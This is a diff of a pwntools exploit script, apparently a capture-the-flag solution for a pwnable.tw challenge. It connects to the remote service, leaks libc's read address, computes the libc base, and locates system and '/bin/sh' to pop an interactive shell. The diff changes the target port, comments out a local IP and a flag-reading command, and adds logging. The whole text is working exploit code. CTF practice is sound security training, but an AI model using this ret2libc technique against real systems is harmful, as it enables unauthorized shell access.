@@ -7,9 +7,9 @@ from pwn import *
 host = 'chall.pwnable.tw'
 port = 10103
 host = '60.251.236.17'
-port = 10100
-host = '192.168.31.140'
-port = 10100
+port = 10103
+#host = '192.168.31.140'
+#port = 10100
 y = remote(host,port)
 
 l = ELF('libc_32.so.6')
@@ -51,7 +51,10 @@ y.recvuntil('Oh ! You win !!\n')
 read_ad = u32( y.recv(77)[:4] )
 log.info(hex(read_ad))
 
+log.success(hex(l.symbols['read']))
+
 libc_base = read_ad - l.symbols['read']
+log.success(hex(libc_base))
 system  = libc_base + l.symbols['system']
 bsh = libc_base + l.search('/bin/sh').next()
 
@@ -67,6 +70,6 @@ up(p)
 bea()
 bea()
 
-y.sendline('cat /home/`whoami`/flag')
+#y.sendline('cat /home/`whoami`/flag')
 
 y.interactive()
